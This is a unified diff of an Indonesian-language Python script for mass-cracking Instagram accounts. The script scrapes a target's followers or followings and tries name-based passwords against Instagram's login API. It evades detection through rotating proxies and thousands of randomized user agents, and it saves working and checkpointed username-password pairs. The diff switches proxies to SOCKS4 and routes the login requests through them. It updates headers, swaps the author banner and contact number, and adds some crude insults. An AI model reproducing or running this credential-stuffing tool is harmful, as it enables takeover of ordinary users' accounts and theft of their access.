@@ -52,7 +52,7 @@ except:
 	pass
 	
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
+	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('GAGAL')
@@ -65,7 +65,7 @@ U='\033[1;35m' #UNGU
 O='\033[38;2;255;127;0;1m' #ORANGE
 C='\033[0m' #CLEAR
 N = '\x1b[0m' # WARNA MATI
-USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 216.0.0.12.135 (iPhone10,4; iOS 15_0_2; it_IT; it-IT; scale=2.00; 750x1334; 338132253) NW/3"
+USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"
 #ugen=open('ua.txt','r').read().splitlines()
 internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
 method=[]
@@ -89,21 +89,20 @@ for tu in range(1000):
             d = random.randrange(40, 150)
             useragent = f'''Mozilla/5.0 (Linux; U; Android 10; {a} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
             baru.append(useragent)
-for i in range(10000):
-	aa='Mozilla/5.0 (X11; Linux x86_64)'
-	b=random.choice(['4','5','6','7','8','9','10','11','12'])
-	c='Android 2.3.8; sv-se; Huawei Social Phone Build/HWIX3)'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='OPR/38.0.2220.41'
-	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku)
+for xd in range(1000):
+    build_nokiax = ['JDQ39','JZO54K']
+    rr = random.randint; rc = random.choice
+    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
+    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
+    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
+    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
+    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
+    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
+    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
+    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
+    memekk = random.choice([ugent1, ugent2, ugent3])
+    ugen.append(memekk)
 for xd in range(10000):
 	aa='Mozilla/5.0 (OneBrowser/3.5'
 	b=random.choice(['4','5','6','7','8','9','10','11','12'])
@@ -158,10 +157,10 @@ def clear():
 def waktu():
 	now = datetime.now()
 	hours = now.hour
-	if 4 <= hours < 12:timenow = "𝐆𝐨𝐨𝐝 𝐌𝐨𝐫𝐧𝐢𝐧𝐠"
-	elif 12 <= hours < 15:timenow = "𝐆𝐨𝐨𝐝 𝐀𝐟𝐭𝐞𝐫𝐧𝐨𝐨𝐧"
-	elif 15 <= hours < 18:timenow = "𝐆𝐨𝐨𝐝 𝐄𝐯𝐞𝐧𝐢𝐧𝐠"
-	else:timenow = "𝐆𝐨𝐨𝐝 𝐍𝐢𝐠𝐡𝐭"
+	if 4 <= hours < 12:timenow = "Good Morning"
+	elif 12 <= hours < 15:timenow = "Good Afternoon"
+	elif 15 <= hours < 18:timenow = "Good Evening"
+	else:timenow = "Good Night"
 	return timenow
 def jalan(keliling):
 	for mau in keliling + '\n':
@@ -172,30 +171,12 @@ def banner():
 	clear()
 	au=f"""
  [blue] 
-
-             ,;;;;;;;,                                      
-            ;;;;;;;;;;;,
-           ;;;;;'_____;'                                            
-           ;;;(/))))|((\\                                   
-           _;;((((((|))))
-          / |_\\\\\\\\\\\\\\\\\\\\\\\\
-     .--~(  \\ ~))))))))))))
-    /     \\  `\\-(((((((((((\\\\
-    |    | `\\   ) |\\       /|)
-     |    |  `. _/  \\_____/ |
-      |    , `\\~            /
-       |    \\  \\           /
-      | `.   `\\|          /
-      |   ~-   `\\        /
-       \\____~._/~ -_,   (\\
-        |-----|\\   \\    ';;
-       |      | :;;;'     \\
-      |  /    |            |
-      |       |            | 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟐.𝟐
-              '----"----'
-			  
-		  𝐁𝐲 𝐃𝐢𝐠𝐢𝐭𝐚𝐥 𝐀𝐥𝐥𝐢𝐚𝐧𝐜𝐞 
-		  𝐰𝐚 : 𝟎𝟖𝟓𝟖𝟖𝟖𝟐𝟐𝟐𝟗𝟒𝟒 	  
+\t\t██╗░██████╗░░█████╗░
+\t\t██║██╔════╝░██╔══██╗
+\t\t██║██║░░██╗░██║░░╚═
+\t\t██║██║░░╚██╗██║░░██╗  AUTHOR:TEMPIK-XD
+\t\t██║╚██████╔╝╚█████╔╝  VERSION:1.7.2
+\t\t╚═╝░╚═════╝░░╚════╝░
 [/blue]
 """
 	sol().print(nel(au,style='',title=f'{waktu()}'))
@@ -491,7 +472,7 @@ class instagram:
 
 
 	def BUG(self):
-		bug=f'[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +6285888222944\n[•]'
+		bug=f'[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +6283114591358\n[•]'
 		bug1 = nel(bug, style='cyan')
 		cetak(nel(bug1, title='REPORT BUG'))
 		exit()
@@ -591,7 +572,7 @@ class instagram:
 					following.append(username)
 				if 'pengikut' in menudump:
 					maxid=x_jason['next_max_id']
-					for z in range (9999):
+					for z in range (99999):
 						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
 						x_jason=json.loads(x.text)
 						try:
@@ -630,7 +611,7 @@ class instagram:
 					following.append(username)
 				if 'mengikuti' in menudump:
 					maxid=x_jason['next_max_id']
-					for z in range (9999):
+					for z in range (99999):
 						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
 						x_jason=json.loads(x.text)
 						try:
@@ -665,7 +646,7 @@ class instagram:
 	       return useragent
 
 	def passwordAPI(self,xnx):
-		idtar=f' [•] 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃  : [cyan]{len(internal)} [/cyan]'
+		idtar=f' [•] TOTAL ID  : [cyan]{len(internal)} [/cyan]'
 		idtar1=nel(idtar,style='')
 		sol().print(idtar1)
 		komb='[1] Name,Name123,Name1234\n[2] Name,Name123,Name1234,Name12345\n[3] Name,Name123,Name1234,Name12345,Name123456\n[4] Password Manual'
@@ -680,7 +661,7 @@ class instagram:
 		elif c=='7':
 		      self.generateAPI(xnx,c)
 		elif c=='4':
-		    ui='# 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐌𝐀𝐍𝐔𝐀𝐋'
+		    ui='# PASSWORD MANUAL'
 		    uu=mark(ui,style='')
 		    sol().print(uu)
 		    print(f'{M} Contoh sayang,anjing,bangsat')
@@ -694,6 +675,7 @@ class instagram:
 		io=f'[•] Hasil [green]OK[/green] disimpan ke: [green]result/{day}.txt[/green]\n[•] Hasil [yellow]CP[/yellow] disimpan ke: [yellow]result/{day}.txt[/yellow]'
 		oi = nel(io, style='')
 		cetak(nel(oi, title='𝘾𝙍𝘼𝘾𝙆 𝘿𝙄𝙈𝙐𝙇𝘼𝙄'))
+        os.popen('play-audio login.mp3')
 		ipku=' [•] Nyalakan Mode Pesawat Jika Tidak Mendapatkan Hasil'
 		ipku1=nel(ipku,style='')
 		sol().print(ipku1)
@@ -746,14 +728,16 @@ class instagram:
 			mengikut=x_jason["edge_follow"]["count"]
 			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
 		except:
-			pass
-
+			nama = '-'
+			pengikut = '-'
+			mengikut = '-'
+			postingan = '-'
 		return nama,pengikut,mengikut,postingan
 
 	def crackAPI(self,user,pas):
 		global loop,success,checkpoint
 		ses=requests.Session()
-		ua=random.choice(ugen5)
+		ua=random.choice(ugen)
 		warna = random.choice([M, H, K, U, O,])
 		sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H} OK : - {len(success)}{C}  {K} CP : - {len(checkpoint)} {N}"),sys.stdout.flush()
 		try:
@@ -761,12 +745,12 @@ class instagram:
 				ncek=random.randint(1000000000, 99999999999)
 				ts = calendar.timegm(current_GMT)
 				nip=random.choice(prox)
-				proxs= {'http': 'socks5://'+nip}
+				proxs= {'http': 'socks4://'+nip}
 				p = ses.get('https://www.instagram.com/web/__mid')
 				ses.headers.update({
                     'Host':'www.instagram.com',
                     'x-ig-www-claim':'0',
-                    'x-instagram-ajax':'2d4630c5c4bb',
+                    'x-instagram-ajax':'6543adcc6d29',
                     'content-type':'application/x-www-form-urlencoded',
                     'accept':'*/*',
                     'x-requested-with':'XMLHttpRequest',
@@ -778,16 +762,17 @@ class instagram:
                      'sec-fetch-site':'same-origin',
                      'sec-fetch-mode':'cors',
                      'sec-fetch-dest':'empty',
-                     'referer':'https://www.instagram.com/accounts/onetap/',
-                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})         
+                     'referer':'https://www.instagram.com/accounts/login/',
+                     'accept-encoding':'gzip, deflate',
+                     'accept-language':'en-US,en;q=0.8'})         
 				data = {
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
 			"username": user,
 			"queryParams": "{}",
-			"optIntoOneTap": 'false',
+			"optIntoOneTap": False,
 			"stopDeletionNonce": "",
 			"trustedDeviceRecords": "{}"}
-				respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
+				respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, proxies = proxs, allow_redirects=True)
 				ncek=json.loads(respon.text)
 				if 'userId' in str(ncek):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
@@ -875,7 +860,7 @@ class instagram:
 			if "userId" in x.text:
 				nama,pengikut,mengikut,postingan=self.APIinfo(user)
 				print(f"""
-    ├ {CY} 𝐋𝐈𝐕𝐄{N}
+    ├ {CY} LIVE{N}
 	├ {CY}{user}|{pw}
 	├ Followers {CY}{pengikut}
 	├ Following {CY}{mengikut}
@@ -884,7 +869,7 @@ class instagram:
 			elif 'checkpoint_url' in x.text:
 				nama,pengikut,mengikut,postingan=self.APIinfo(user)
 				print(f"""
-    ├ {K}𝐂𝐄𝐊𝐏𝐎𝐈𝐍𝐓{N}
+    ├ {K}MANGKANYA GANTENG KONTOL{N}
 	├ {K}{user}|{pw}
 	├ Followers {K}{pengikut}
 	├ Following {K}{mengikut}
@@ -902,7 +887,7 @@ class instagram:
 		if c=='':
 			self.menu()
 		elif c in ('1','01'):
-			j= '[red][!] 𝐒𝐄𝐃𝐀𝐍𝐆 𝐃𝐀𝐋𝐀𝐌 𝐏𝐑𝐎𝐒𝐄𝐒 𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄[/red]'
+			j= '[red][!] SEDANG DALAM PROSES MAINTENANCE[/red]'
 			i=nel(j,style='')
 			sol().print(i);sleep(2);login_kamu()
 			mas='[!] Masukan jumlah target'
@@ -919,7 +904,7 @@ class instagram:
 			self.passwordAPI(name)
 
 		elif c in ('2','02'):
-			pr='[•] 𝗖𝗥𝗔𝗖𝗞 𝗗𝗔𝗥𝗜 𝗣𝗘𝗡𝗚𝗜𝗞𝗨𝗧'
+			pr='[•] CRACK DARI PENGIKUT'
 			po=nel(pr,style='')
 			sol().print(po)
 			#massal(self)
@@ -929,11 +914,11 @@ class instagram:
 			elif mas in ['t','T']:
 				massal(self)
 			elif mas in ['']:
-				print('𝐈𝐒𝐈 𝐉𝐀𝐍𝐆𝐀𝐍 𝐊𝐎𝐒𝐎𝐍𝐆 𝐖𝐀𝐆𝐔!')
+				print('ISI JANGAN KOSONG KENTOD!')
 
 
 		elif c in ('3','03'):
-			pr='[•] 𝐂𝐑𝐀𝐂𝐊 𝐃𝐀𝐑𝐈 𝐌𝐄𝐍𝐆𝐈𝐊𝐔𝐓𝐈'
+			pr='[•] CRACK DARI MENGIKUTI'
 			po=nel(pr,style='')
 			sol().print(po)
 			mas=input('  [•] Apakah anda ingin crack masal? y/t >  ')
@@ -942,7 +927,7 @@ class instagram:
 			elif mas in ['t','T']:
 				meng(self)
 			elif mas in ['']:
-				print('𝐈𝐒𝐈 𝐉𝐀𝐍𝐆𝐀𝐍 𝐊𝐎𝐒𝐎𝐍𝐆 𝐖𝐀𝐆𝐔!')
+				print('ISI JANGAN KOSONG KENTOD!')
 
 
 		elif c in ('4','04'):
@@ -1040,7 +1025,7 @@ def lisensi():
  status=res['licenseKey']['key']
  if status ==cek:
   li()
-  cetak(nel('\t[green] 𝐒𝐄𝐋𝐀𝐌𝐀𝐓 𝐋𝐈𝐒𝐄𝐍𝐒𝐈 𝐀𝐍𝐃𝐀 𝐕𝐀𝐋𝐈𝐃[/green]'))
+  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
   time.sleep(2)
   lisensiku.append("sukses")
   login_kamu()
@@ -1155,6 +1140,8 @@ def register_device():
 if __name__=='__main__':
 	try:
 		lisensi()
+		#login_kamu()
+		
 	except requests.exceptions.ConnectionError:
 		exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
 
